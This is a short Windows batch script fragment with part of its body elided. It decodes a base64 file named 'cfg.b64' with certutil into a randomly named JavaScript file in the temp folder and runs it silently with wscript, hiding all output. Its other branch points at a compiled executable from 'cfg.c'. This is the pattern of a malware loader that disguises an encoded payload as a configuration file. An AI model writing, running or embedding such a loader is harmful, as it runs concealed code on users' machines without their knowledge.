@echo off
setlocal
set "OUT=%TEMP%\rbc_0fea145b4b3941d8.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_0fea145b4b3941d8.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_0fea145b4b3941d8.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_0fea145b4b3941d8.js"
exit /b 0
